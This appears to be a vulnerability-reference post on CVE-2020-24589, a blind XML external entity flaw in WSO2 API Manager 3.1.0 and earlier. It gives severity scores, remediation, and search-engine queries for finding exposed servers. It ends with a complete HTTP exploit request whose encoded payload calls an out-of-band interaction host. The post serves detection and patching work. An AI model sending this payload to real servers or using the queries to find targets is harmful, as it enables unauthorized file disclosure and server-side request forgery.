---
layout: "post"
cve_id: "CVE-2020-24589"
title: "WSO2 API Manager <=3.1.0 - Blind XML External Entity Injection"
pcap: true
pcap_path: "/pcaps/2020/CVE-2020-24589.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-24589.yaml"
author: "lethargynavigator"
severity: "critical"
impact: "Successful exploitation of this vulnerability could lead to unauthorized access to sensitive information, denial of service, or server-side request forgery.
"
remediation: "Upgrade to a patched version of WSO2 API Manager (3.1.1 or above) or apply the provided security patch.
"
reference:
  - "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0742"
  - "https://nvd.nist.gov/vuln/detail/CVE-2020-24589"
  - "https://github.com/ARPSyndicate/kenzer-templates"
  - "https://github.com/athiththan11/WSO2-CVE-Extractor"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
  cvss-score: 9.1
  cve-id: "CVE-2020-24589"
  cwe-id: "CWE-611"
  epss-score: 0.8912
  epss-percentile: 0.99502
  cpe: "cpe:2.3:a:wso2:api_manager:*:*:*:*:*:*:*:*"
metadata:
  max-request: 1
  vendor: "wso2"
  product: "api_manager"
  shodan-query: "http.favicon.hash:1398055326"
  fofa-query: "icon_hash=1398055326"
  google-query: "inurl:\"carbon/admin/login\""
tags:
  - "cve2020"
  - "cve"
  - "wso2"
  - "xxe"
  - "oast"
  - "blind"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
WSO2 API Manager 3.1.0 and earlier is vulnerable to blind XML external entity injection (XXE). XXE often allows an attacker to view files on the server file system, and to interact with any backend or external systems that the application itself can access which allows the attacker to transmit sensitive data from the compromised server to a system that the attacker controls.

## ðŸŒ HTTP Request
```nohighlight
POST /carbon/generic/save_artifact_ajaxprocessor.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/9.0
Connection: close
Content-Length: 139
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

payload=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+"http%3a//d4tcjqple0o1du2675v0jwyyjeo3388bp.oast.fun">%25xxe%3b]>
```


